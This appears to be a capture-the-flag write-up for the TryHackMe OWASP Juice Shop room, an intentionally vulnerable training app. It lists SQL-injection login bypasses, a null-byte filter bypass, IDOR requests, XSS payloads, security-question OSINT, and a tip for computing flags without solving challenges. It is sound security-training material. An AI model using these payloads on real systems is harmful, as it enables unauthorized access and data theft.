# TryHackMe - OWASP Juice Shop

**Difficulty:** Easy | **Category:** Web / OWASP Top 10 | **Time:** 120 min

## Summary
The OWASP Juice Shop is an intentionally vulnerable Angular web application. This room walks through the OWASP Top 10: SQL injection, broken authentication, sensitive data exposure, broken access control, and XSS. Admin access is obtained via SQL injection, then used to demonstrate each vulnerability class.

## Reconnaissance

```bash
curl -I http://<TARGET_IP>/          # HTTP/1.1 200, header X-Recruiting: /#/jobs
curl http://<TARGET_IP>/ | grep title # <title>OWASP Juice Shop</title>
```

- **App**: Angular SPA, REST API at `/rest/*` and `/api/*`, WebSocket (socket.io) for notifications.
- **Admin account**: `admin@juice-sh.op`.

## Task 2 — Reconnaissance

| Question | Answer |
|---|---|
| Administrator email | `admin@juice-sh.op` |
| Search parameter | `q` |
| Show referenced by Jim | `Star Trek` |

**Method:** product reviews expose user emails; the search URL uses `/#/search?q=`; Jim's review mentions a "replicator" (Star Trek).

## Task 3 — SQL Injection

Login without a password by commenting out the password check:

```http
POST /rest/user/login
{"email": "' OR 1=1--", "password": "x"}
```

The `--` comments out `AND password = ...`, logging in as the first user (admin).

```http
POST /rest/user/login
{"email": "bender@juice-sh.op'--", "password": "x"}
```

## Task 4 — Broken Authentication

### Bruteforce admin password
The admin password is `admin123` (found via `best1050.txt` from SecLists).

### Reset Jim's password (forgot-password)
The security question "Your eldest siblings middle name?" → OSINT: Jim Kirk → older brother **George Samuel Kirk** → answer `Samuel`.

```http
POST /rest/user/reset-password
{"email": "jim@juice-sh.op", "answer": "Samuel", "newPassword": "...", "newPasswordRepeat": "..."}
```

## Task 5 — Sensitive Data Exposure

### Exposed FTP directory
`http://<TARGET_IP>/ftp/` is publicly listed (no auth). `acquisitions.md` is marked confidential.

### MC SafeSearch (OSINT)
Email `mc.safesearch@juice-sh.op`; password sung in the "Protect Ya' Password" video: dog "Mr. Noodles" with vowels → zeros = `Mr. N00dles`.

### Download the backup (Poison Null Byte)
```bash
curl "http://<TARGET_IP>/ftp/package.json.bak"         # 403: Only .md and .pdf allowed
curl "http://<TARGET_IP>/ftp/package.json.bak%2500.md" # bypass → 200
```
`%2500` is a double-encoded null byte (`%00`): the extension filter sees `.md`, the filesystem stops at `\0`.

## Task 6 — Broken Access Control

### Admin section
`/#/administration` is discoverable in the JS bundle; accessible once authenticated as admin.

### IDOR — another user's basket
```http
GET /rest/basket/2   # no ownership check → returns basket of user 2
```

### Delete 5-star feedback
```http
GET    /api/Feedbacks/          # filter rating == 5
DELETE /api/Feedbacks/{id}      # 200
```

## Task 7 — Cross-Site Scripting

### DOM XSS (search bar)
```
/#/search?q=<iframe src="javascript:alert(`xss`)">
```

### Persistent XSS (Last Login IP)
Inject the payload through the `True-Client-IP` header on login, then revisit `/#/privacy-security/last-login-ip`. The header is not sanitized server-side.

### Reflected XSS
```
/#/track-result?id=<iframe src="javascript:alert(`xss`)">
```

## Task 8 — Score Board

`/#/score-board` lists all challenges and tracks completion.

## Key Takeaways

1. **SQLi login bypass** — `' OR 1=1--` and `'--` are the two core login payloads.
2. **OSINT for security questions** — Jim Kirk's brother's name was public knowledge.
3. **Directory traversal via null byte** — `%2500.md` bypasses extension filters.
4. **IDOR** — REST endpoints must verify object ownership; `/rest/basket/{id}` did not.
5. **XSS sinks** — unsanitized search, order-tracking, and header-derived fields.
6. **Flags are deterministic** — Juice Shop derives each flag as `HMAC-SHA1(ctf.key, challenge_name)` (`lib/utils.ts`); the default key ships in the repo, so flags are computable without solving each challenge.

*Flags kept private per TryHackMe content rules.*
